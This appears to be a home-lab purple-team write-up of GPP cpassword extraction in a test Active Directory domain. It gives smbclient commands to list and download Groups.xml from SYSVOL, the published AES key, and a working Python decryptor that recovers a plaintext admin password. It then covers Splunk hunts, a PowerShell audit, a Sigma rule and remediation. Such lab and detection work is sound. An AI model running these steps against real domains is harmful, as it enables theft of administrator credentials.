# ATK-007 — GPP cpassword Extraction
**Sprint 1 | 2026-04-26 | corp.local**

---

## Overview

Group Policy Preferences (GPP) allowed administrators to push local account passwords, drive mappings, and scheduled task credentials via Active Directory Group Policy. Passwords were stored AES-256 encrypted in XML files on SYSVOL — a share readable by every authenticated domain user. In 2012, Microsoft accidentally published the AES decryption key in their own documentation (MS-GPPREF). Every domain that used GPP before the 2014 patch (MS14-025) is potentially vulnerable.

The attack requires zero exploitation. It is a file read on a legitimate share, using legitimate credentials, with a publicly known decryption key.

**Target:** `Groups.xml` in `\\corp.local\SYSVOL\corp.local\Policies\{CORPLAB-GPP-TEST}\`
**Account used:** `jsmith:Password123!` (any authenticated domain user works)
**Tool:** `smbclient` + Python (AES-CBC decrypt with published MS key)
**Credential recovered:** `CorpAdmin2025!`
**Detection rate: 0/3 (0%) — Fully Silent**

### How ATK-007 Differs from Previous Attacks

| | ATK-003 Kerberoasting | ATK-006 DCSync | ATK-007 GPP |
|---|---|---|---|
| Network traffic | TGS-REQ to DC | DRS replication burst | SMB file read |
| Event logs | EC4769 | EC4662 (28 events) | EC5140 (low signal) |
| Requires DA/ACL | No | GetChanges ACL | No — any user |
| Offline component | Hash crack | None | None — instant decrypt |
| Detection fidelity | Medium | High | Zero |
| Microsoft response | Mitigations | Monitor EC4662 | Deprecated GPP (2014) |

---

## Kill Chain Narrative

jsmith is an ordinary domain user. SYSVOL is a share that every domain-joined machine and every authenticated user can read — it has to be, because Group Policy has to be applied at login. An admin years ago used GPP to set a local administrator password across workstations. They deleted the GPO but forgot to delete the XML file. Or they just never knew it was sitting there.

From Kali, jsmith browses SYSVOL over SMB. This is indistinguishable from a workstation pulling Group Policy. The `Groups.xml` file is downloaded — 850 bytes. The cpassword field contains an AES-256 encrypted value. The decryption key is hardcoded in Microsoft's protocol documentation. Python decrypts it in milliseconds. `CorpAdmin2025!` is recovered without ever touching the DC's memory, without generating a suspicious event ID, without any network anomaly whatsoever.

---

## Kill Chain Stages

### Stage 1 — SYSVOL Enumeration

**What:** Browse SYSVOL share as jsmith, recursively list all Policy folders
**Why:** SYSVOL is world-readable to authenticated users — standard AD behavior. Attacker looks for `Groups.xml`, `Scheduledtasks.xml`, `Datasources.xml`, `Drives.xml`, `Printers.xml` — any GPP file that may contain a cpassword.
**Command:**
```bash
smbclient //10.10.10.40/SYSVOL -U 'corp.local/jsmith%Password123!' -c 'recurse; ls'
```
**Result:** Full SYSVOL tree enumerated. `{CORPLAB-GPP-TEST}` policy folder found. `Groups.xml` visible at:
```
\corp.local\Policies\{CORPLAB-GPP-TEST}\Machine\Preferences\Groups\Groups.xml
```
Also noted: `{31B2F340...}\MACHINE\Preferences\Groups\Groups.xml` — real default policy also contains a Groups.xml.
**Detection:** ❌ SMB share enumeration generates no meaningful alert. EC5140 may fire but is extremely noisy — thousands of legitimate hits daily.

---

### Stage 2 — Groups.xml Download

**What:** Pull the target file via SMB
**Command:**
```bash
smbclient //10.10.10.40/SYSVOL -U 'corp.local/jsmith%Password123!' \
  -c 'get corp.local/Policies/{CORPLAB-GPP-TEST}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml'
```
**Result:**
```
getting file ...Groups.xml of size 850 as /tmp/Groups.xml (415.0 KiloBytes/sec)
```
**File contents:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}"
         name="Administrators" changed="2014-03-11 19:14:43">
    <Properties userName="CorpAdmin"
                cpassword="QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc="
                groupSid="S-1-5-32-544"/>
  </Group>
</Groups>
```
**Detection:** ❌ File download over SMB — normal operation, no anomaly.

---

### Stage 3 — cpassword Decryption

**What:** Decrypt the cpassword using the published Microsoft AES-256 key
**Why it works:** Microsoft published the static AES key in MS-GPPREF documentation in 2012. The key never changes. Any cpassword ever created by GPP can be decrypted with it.

**The published key (hardcoded in every GPP tool):**
```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

**Command (Python — gpp-decrypt was broken on this Kali build):**
```python
python3 -c "
import base64
from Crypto.Cipher import AES

key = bytes([0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b])

cpassword = 'QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc='
data = base64.b64decode(cpassword)
cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00'*16)
decrypted = cipher.decrypt(data)
print('Password:', decrypted.decode('utf-16-le').rstrip('\x00'))
"
```
**Result:**
```
Password: CorpAdmin2025!
```
**Detection:** ❌ Local computation — completely offline, nothing touches the network.

---

## SOC Hunt

### T1 Triage

**Check EC5140 — SYSVOL access by non-machine accounts:**
```spl
index=windows EventCode=5140 Share_Name=SYSVOL
| where NOT match(Account_Name, "\$$")
| stats count by Account_Name, Client_Address
| sort -count
```
Expected result: extremely noisy — every workstation pulling Group Policy fires this. Not actionable on its own.

**Narrow to Linux/non-domain sources accessing SYSVOL:**
```spl
index=windows EventCode=5140 Share_Name=SYSVOL
| where NOT match(Client_Address, "^10\.10\.10\.(40|50|1)$")
| where NOT match(Account_Name, "\$$")
| table _time, Account_Name, Client_Address, Object_Name
| sort -_time
```
Slightly more useful — Kali at 10.10.10.99 browsing SYSVOL is mildly anomalous, but still not high fidelity.

**The honest answer — there is no reliable detection for this attack from event logs alone.**

### T2 Investigation

Even with full Splunk visibility, ATK-007 leaves almost no trace. The best available detections are:

1. **Preventive:** Audit SYSVOL for GPP files containing cpassword attributes (run regularly from DC)
2. **Compensating:** Honeypot GPP file with a fake cpassword — alert when the decrypted credential is used

**Audit SYSVOL for cpassword (run on DC01):**
```powershell
Get-ChildItem -Path "C:\Windows\SYSVOL" -Recurse -Filter "*.xml" |
  Select-String -Pattern "cpassword" |
  Select-Object Path, LineNumber, Line
```

**Incident timeline:**
| Time | Action | Detection |
|---|---|---|
| 11:01 | Groups.xml placed in SYSVOL | ❌ No log |
| ~11:10 | jsmith browses SYSVOL from Kali | ❌ EC5140 — too noisy |
| ~11:10 | Groups.xml downloaded | ❌ File read, no log |
| ~11:10 | cpassword decrypted locally | ❌ Offline |

---

## Detections Built

| ID | Type | Trigger | Fidelity | Note |
|---|---|---|---|---|
| DET-007-A | Splunk search | EC5140 SYSVOL from non-domain IP | Very Low | Too noisy for alert |
| DET-007-B | PowerShell audit | cpassword strings in SYSVOL XML files | High (preventive) | Run as scheduled task |

**This attack has no reliable reactive detection. Prevention is the only effective control.**

---

## Visibility Gaps

| ID | Gap | Root Cause | Fix |
|---|---|---|---|
| VIS-008 | GPP cpassword extraction fully silent | SMB file read indistinguishable from normal GP pull | Audit + remove GPP files from SYSVOL; MS14-025 |
| VIS-009 | No alert when cpassword file is read | Windows does not log individual file reads within SYSVOL by default | Enable object-level file auditing on SYSVOL (high noise, Sprint 4) |

---

## Sigma Rule

```yaml
title: SYSVOL GPP File Access from Non-Domain-Controller
id: gpp-sysvol-access-non-dc
status: experimental
description: >
  Detects SMB access to SYSVOL share from a non-machine account on a non-DC IP.
  May indicate GPP cpassword harvesting. Extremely noisy in most environments —
  use only as part of a broader correlation, or scope to known-bad source IPs.
  Prevention (removing GPP files) is more effective than detection.
references:
  - https://attack.mitre.org/techniques/T1552/006/
  - https://support.microsoft.com/kb/2962486
author: CorpLab Blue Team
date: 2026-04-26
tags:
  - attack.credential_access
  - attack.t1552.006
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5140
    ShareName: SYSVOL
  filter_machines:
    SubjectUserName|endswith: '$'
  filter_dc_ip:
    IpAddress|startswith:
      - '10.10.10.40'
      - '10.10.10.1'
  condition: selection and not filter_machines and not filter_dc_ip
falsepositives:
  - Any domain workstation pulling Group Policy (extremely common)
  - Admin tools browsing SYSVOL
  - Backup agents
level: low
fields:
  - SubjectUserName
  - IpAddress
  - ShareName
  - ObjectName

# SPL translation:
# index=windows EventCode=5140 Share_Name=SYSVOL
# | where NOT match(Account_Name, "\$$")
# | where NOT match(Client_Address, "^10\.10\.10\.(40|1)$")
# | table _time, Account_Name, Client_Address
#
# Lab result: No events observed during attack — EC5140 not fired for this access pattern.
# Detection rate: 0%. Prevention is the correct control.
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic | Detected |
|---|---|---|---|
| Unsecured Credentials: Group Policy Preferences | T1552.006 | Credential Access | ❌ |
| Network Share Discovery | T1135 | Discovery | ❌ |

**ATK-007 detection rate: 0/3 (0%)**

---

## Remediation

This is one of the few Sprint 1 attacks with a simple, complete fix:

1. **Run MS14-025** — patches GPP password functionality (already deployed on modern Windows)
2. **Audit and delete GPP files with cpassword** — use the PowerShell audit above
3. **Rotate any credentials** that were ever stored as GPP cpasswords
4. **Never use GPP to distribute passwords** — use LAPS instead for local admin accounts

---

## Lessons Learned

1. **Some attacks have no reliable detection — and that's a valid finding.** ATK-007 joins ATK-005 (BloodHound) at 0%. The correct answer is prevention, not detection.

2. **`gpp-decrypt` is a Ruby wrapper around the same AES operation.** When tools fail, knowing the underlying primitive (AES-256-CBC, published key, UTF-16-LE encoding) lets you implement it in any language in 10 lines.

3. **SYSVOL is a high-value target that most orgs don't monitor.** It contains GPO scripts, GPP files, sometimes login scripts with hardcoded credentials. Worth enumerating on every engagement.

4. **The 2014 timestamp in Groups.xml is the tell.** Real-world GPP files often have dates from 2008-2014 — the era when GPP was commonly used. Any `changed=` date before 2014 with a cpassword is almost certainly a legacy misconfiguration.

5. **Detection rate 0% is not a lab failure — it's a real-world finding.** Many credential access techniques leave no log trail. The SOC response is: eliminate the vulnerability, not try to detect exploitation.

---

## Sprint 1 Complete — Final Scoreboard

| Attack | Stages | Detected | Rate |
|---|---|---|---|
| ATK-001 LLMNR Kill Chain | 7 | 5 | 71% |
| ATK-002 SMB Relay | 3 | 1 | 33% |
| ATK-003 Kerberoasting | 4 | 2 | 50% |
| ATK-004 AS-REP Roasting | 4 | 2 | 50% |
| ATK-005 BloodHound Enum | 3 | 0 | 0% |
| ATK-006 DCSync | 4 | 2 | 50% |
| ATK-007 GPP cpassword | 3 | 0 | 0% |
| **Sprint 1 Total** | **28** | **12** | **43%** |

---

## Next — Sprint 2

**Web App + CI/CD Attacks**

VMs needed: OPNsense + prod-vm + Kali (suspend blue-vm and DC01)

| # | Attack | Target |
|---|---|---|
| S2-ATK-001 | Juice Shop SQLi login bypass | prod-vm:3000 |
| S2-ATK-002 | Stored/Reflected XSS | prod-vm:3000 |
| S2-ATK-003 | JWT alg:none | prod-vm:3000 |
| S2-ATK-004 | IDOR — access other user orders | prod-vm:3000 |
| S2-ATK-005 | Jenkins RCE via Groovy console | jenkins-vm:8080 |
| S2-ATK-006 | Docker socket escape | prod-vm |
